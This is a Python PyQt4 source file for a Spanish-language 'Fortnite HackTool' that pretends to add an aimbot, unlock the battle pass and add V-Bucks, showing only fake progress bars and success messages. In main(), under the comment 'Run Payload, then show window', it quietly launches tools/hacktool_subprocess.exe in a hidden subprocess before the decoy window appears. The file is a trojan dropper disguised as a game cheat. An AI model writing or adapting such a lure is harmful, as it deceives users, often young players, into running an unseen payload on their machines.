# -*- coding: utf-8 -*-
import sys, subprocess, os, time
from PyQt4.QtCore import *
from PyQt4 import QtCore,QtGui
from PyQt4.QtGui import QApplication,QDialog,QMainWindow

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

class Ui_LoginDialog(object):
    def setupUi(self, logging_dialog):
        logging_dialog.setObjectName(_fromUtf8("logging_dialog"))
        logging_dialog.resize(253, 144)
        logging_dialog.setMinimumSize(QtCore.QSize(253, 144))
        logging_dialog.setMaximumSize(QtCore.QSize(253, 144))
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(_fromUtf8("./img/icon.ico")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        logging_dialog.setWindowIcon(icon)
        self.label = QtGui.QLabel(logging_dialog)
        self.label.setGeometry(QtCore.QRect(20, 10, 221, 41))
        self.label.setObjectName(_fromUtf8("label"))
        self.label_2 = QtGui.QLabel(logging_dialog)
        self.label_2.setGeometry(QtCore.QRect(20, 50, 211, 21))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.label_3 = QtGui.QLabel(logging_dialog)
        self.label_3.setGeometry(QtCore.QRect(20, 70, 81, 16))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.progressBarNotif = QtGui.QProgressBar(logging_dialog)
        self.progressBarNotif.setGeometry(QtCore.QRect(20, 100, 221, 23))
        self.progressBarNotif.setProperty("value", 76)
        self.progressBarNotif.setOrientation(QtCore.Qt.Horizontal)
        self.progressBarNotif.setInvertedAppearance(False)
        self.progressBarNotif.setObjectName(_fromUtf8("progressBarNotif"))

        self.retranslateUi(logging_dialog)
        QtCore.QMetaObject.connectSlotsByName(logging_dialog)

    def retranslateUi(self, logging_dialog):
        logging_dialog.setWindowTitle(_translate("logging_dialog", "Dialog", None))
        self.label.setText(_translate("logging_dialog", "<html><head/><body><p><span style=\" font-size:20pt;\">Iniciando sesion...</span></p></body></html>", None))
        self.label_2.setText(_translate("logging_dialog", "Por favor, espera mientras comprobamos", None))
        self.label_3.setText(_translate("logging_dialog", "tus credenciales", None))

class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        MainWindow.setObjectName(_fromUtf8("MainWindow"))
        MainWindow.resize(370, 322)
        MainWindow.setMinimumSize(QtCore.QSize(370, 322))
        MainWindow.setMaximumSize(QtCore.QSize(370, 322))
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(_fromUtf8("./img/icon.ico")), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        MainWindow.setTabShape(QtGui.QTabWidget.Rounded)
        self.centralwidget = QtGui.QWidget(MainWindow)
        self.centralwidget.setObjectName(_fromUtf8("centralwidget"))
        self.line = QtGui.QFrame(self.centralwidget)
        self.line.setGeometry(QtCore.QRect(250, 10, 20, 301))
        self.line.setFrameShape(QtGui.QFrame.VLine)
        self.line.setFrameShadow(QtGui.QFrame.Sunken)
        self.line.setObjectName(_fromUtf8("line"))
        self.progressBar = QtGui.QProgressBar(self.centralwidget)
        self.progressBar.setGeometry(QtCore.QRect(20, 290, 231, 23))
        self.progressBar.setMaximum(100)
        self.progressBar.setProperty("value", 0)
        self.progressBar.setObjectName(_fromUtf8("progressBar"))
        self.label_4 = QtGui.QLabel(self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(270, 10, 91, 301))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.label_5 = QtGui.QLabel(self.centralwidget)
        self.label_5.setGeometry(QtCore.QRect(10, 10, 221, 31))
        self.label_5.setObjectName(_fromUtf8("label_5"))
        self.groupBox = QtGui.QGroupBox(self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(10, 50, 241, 81))
        self.groupBox.setObjectName(_fromUtf8("groupBox"))
        self.lineEdit_2 = QtGui.QLineEdit(self.groupBox)
        self.lineEdit_2.setGeometry(QtCore.QRect(80, 50, 91, 20))
        self.lineEdit_2.setEchoMode(QtGui.QLineEdit.Password)
        self.lineEdit_2.setObjectName(_fromUtf8("lineEdit_2"))
        self.label = QtGui.QLabel(self.groupBox)
        self.label.setGeometry(QtCore.QRect(30, 20, 41, 21))
        self.label.setObjectName(_fromUtf8("label"))
        self.lineEdit = QtGui.QLineEdit(self.groupBox)
        self.lineEdit.setGeometry(QtCore.QRect(80, 20, 91, 20))
        self.lineEdit.setObjectName(_fromUtf8("lineEdit"))
        self.label_2 = QtGui.QLabel(self.groupBox)
        self.label_2.setGeometry(QtCore.QRect(10, 50, 61, 16))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.pushButton_4 = QtGui.QPushButton(self.groupBox)
        self.pushButton_4.setGeometry(QtCore.QRect(180, 30, 51, 31))
        self.pushButton_4.setObjectName(_fromUtf8("pushButton_4"))
        self.groupBox_2 = QtGui.QGroupBox(self.centralwidget)
        self.groupBox_2.setGeometry(QtCore.QRect(10, 140, 241, 51))
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.spinBox = QtGui.QSpinBox(self.groupBox_2)
        self.spinBox.setGeometry(QtCore.QRect(60, 20, 61, 22))
        self.spinBox.setMinimum(100)
        self.spinBox.setMaximum(10000)
        self.spinBox.setSingleStep(100)
        self.spinBox.setProperty("value", 500)
        self.spinBox.setObjectName(_fromUtf8("spinBox"))
        self.label_3 = QtGui.QLabel(self.groupBox_2)
        self.label_3.setGeometry(QtCore.QRect(20, 20, 31, 21))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.pushButton = QtGui.QPushButton(self.groupBox_2)
        self.pushButton.setGeometry(QtCore.QRect(140, 20, 81, 23))
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.groupBox_3 = QtGui.QGroupBox(self.centralwidget)
        self.groupBox_3.setGeometry(QtCore.QRect(10, 200, 241, 81))
        self.groupBox_3.setObjectName(_fromUtf8("groupBox_3"))
        self.pushButton_2 = QtGui.QPushButton(self.groupBox_3)
        self.pushButton_2.setGeometry(QtCore.QRect(10, 20, 221, 23))
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.pushButton_3 = QtGui.QPushButton(self.groupBox_3)
        self.pushButton_3.setGeometry(QtCore.QRect(10, 50, 221, 23))
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(_translate("MainWindow", "Fortnite HackTool", None))
        self.label_4.setText(_translate("MainWindow", "<html><head/><body><p><img src=\"./img/hack_tool.jpg\"/></p></body></html>", None))
        self.label_5.setText(_translate("MainWindow", "<html><head/><body><p><span style=\" font-size:12pt; font-weight:600;\">Fortnite HackTool</span><span style=\" font-size:12pt; font-weight:600; vertical-align:sub;\"> By azx</span></p></body></html>", None))
        self.groupBox.setTitle(_translate("MainWindow", "Login", None))
        self.label.setText(_translate("MainWindow", "Usuario", None))
        self.label_2.setText(_translate("MainWindow", "Contraseña", None))
        self.pushButton_4.setText(_translate("MainWindow", "Login", None))
        self.groupBox_2.setTitle(_translate("MainWindow", "PaVos", None))
        self.label_3.setText(_translate("MainWindow", "PaVos", None))
        self.pushButton.setText(_translate("MainWindow", "Añadir", None))
        self.groupBox_3.setTitle(_translate("MainWindow", "Otros", None))
        self.pushButton_2.setText(_translate("MainWindow", "Añadir AimBot", None))
        self.pushButton_3.setText(_translate("MainWindow", "Desbloquear Pase de Batalla", None))

class MainWindow(QtGui.QMainWindow,Ui_MainWindow,object):
    def __init__(self, parent = None):
        QtGui.QMainWindow.__init__(self,parent)
        self.setupUi(self)

        self.pushButton_4.clicked.connect(self.startLoginDialog)

        self.pushButton_2.clicked.connect(self.showProgress)
        self.pushButton_3.clicked.connect(self.showProgress)
        self.pushButton.clicked.connect(self.showProgress)

    def startLoginDialog(self):
        MESSAGE = "<h2>Sesion iniciada</h2>" \
            "<p>Disfruta de los hacks :)</p>"

        msgBox = QtGui.QMessageBox(QtGui.QMessageBox.Information,"Login", MESSAGE, QtGui.QMessageBox.NoButton, self)
        msgBox.addButton("Ok", QtGui.QMessageBox.AcceptRole)
        time.sleep(20)
        msgBox.exec_()

    def showProgress(self):
        current_value = 0

        # Valores aleatorios para el ProgressBar xD
        for value in [10, 11, 2, 20, 0, 1, 1, 13, 15, 3, 1, 5, 18]:
            if value != 15:
                time.sleep(.08)

            if value == 18:
                time.sleep(3)

            if value == 20:
                time.sleep(8)

            current_value += value
            self.progressBar.setValue(current_value)

        MESSAGE = "<h2>Hack completado</h2>" \
            "<p>Valido durante 2 semanas</p>"

        msgBox = QtGui.QMessageBox(QtGui.QMessageBox.Information,"Completado", MESSAGE, QtGui.QMessageBox.NoButton, self)
        msgBox.addButton("Guay", QtGui.QMessageBox.AcceptRole)
        msgBox.exec_()
        self.progressBar.setValue(0)

def main():

    # Run Payload, then show window
    executable_location = os.path.join(os.getcwd(), "tools", "hacktool_subprocess.exe")
    pid = subprocess.Popen([sys.executable, executable_location], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    app = QtGui.QApplication(sys.argv)
    window = MainWindow(None)
    window.show()
    app.exec_()

main()
